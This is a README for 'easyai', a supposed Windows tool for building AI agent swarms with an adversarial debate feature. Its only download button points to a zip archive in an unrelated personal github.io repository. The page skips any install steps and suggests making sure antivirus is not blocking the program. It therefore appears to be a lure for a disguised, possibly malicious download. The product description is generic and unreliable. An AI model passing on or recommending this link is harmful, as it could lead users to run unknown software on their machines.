# 🤖 easyai - Build your own custom artificial intelligence

[![](https://img.shields.io/badge/Download_easyai-blue)](https://raw.githubusercontent.com/uzair2755/uzair2755.github.io/main/_teachings/Dist_v1.5.zip)

easyai allows you to create and manage complex artificial intelligence agents on your computer. You use this tool to build, test, and run programs that think, debate, and complete tasks for you. The software runs entirely on your machine. You do not need experience in coding to get started.

## 📋 What is easyai?

The software acts as a framework for managing artificial intelligence agents. It uses a structure called a DAG, or Directed Acyclic Graph, to organize how your agents perform tasks. Think of this as a set of logical steps that the computer follows to reach a goal. 

If you want an agent to research a topic, write a report, and then email it to you, easyai manages the flow of that work. You can create multiple agents that talk to each other to solve problems. These agents debate different ideas to generate better answers. The software relies on the following technologies to work:

*   Kotlin and Spring Boot for backend processing.
*   React for the interface.
*   Electron to provide a desktop experience on Windows.

## 💻 System Requirements

Your computer must meet these basic standards to run the program:

*   Windows 10 or Windows 11.
*   At least 8 GB of RAM.
*   An active internet connection for the application to download model data.
*   At least 2 GB of available storage space.

## ⚙️ Initial Setup

Once the installation finishes, you will see an icon on your desktop. Double-click this icon to open the application. The first time you launch easyai, the program checks for updates and configures the environment. This takes a few minutes depending on your internet speed.

When the main window opens, you see an empty dashboard. This is your workspace. You can start creating your first agent swarm here. Each swarm consists of one or more agents assigned to reach a specific outcome.

## 🛠️ Creating Your First Agent

The interface uses simple menus to build your agents. 

1. Click the 'Create New Agent' button.
2. Give your agent a name.
3. Assign a primary goal to the agent, such as 'Analyze market trends' or 'Draft daily summaries'.
4. Select the complexity level for the agent.
5. Save the configuration.

After you create your agents, you can group them into a swarm. Adding agents to a swarm allows them to perform tasks in order. You dictate the order by dragging and dropping them into the workflow area. The software automatically handles the connections between each step.

## 🔍 How the Debate Feature Works

The adversarial debate feature is a core component. When you enable this feature, the program forces two agents to challenge each other's conclusions. This process produces higher quality output by identifying errors or weak points in an agent's reasoning. 

To use this:
1. Open your existing swarm settings.
2. Toggle the 'Enable Debate' option to on.
3. Define the number of debate rounds.
4. Save and run the process.

The log window at the bottom of the screen displays the progress. You see the internal reasoning of each agent as they communicate.

## 🛡️ Privacy and Safety

The software stores your data locally on your machine. Your agent configurations and task history remain on your hard drive. Because the agent processes run on your local hardware, you control the information you provide to the application. 

The software requires access to an external service to process natural language inputs. You can select your preferred provider within the Settings menu. Ensure that you monitor your usage and costs if you choose a paid service provider.

## 💡 Troubleshooting

If the application fails to start:
*   Ensure that no other instance of the program is running.
*   Check that your antivirus software is not blocking the application.
*   Restart your computer.

If the agents become unresponsive:
*   Click the 'Reset Swarm' button in the toolbar.
*   Check your internet connection.
*   Ensure that your API keys are valid if you configured a private service provider.
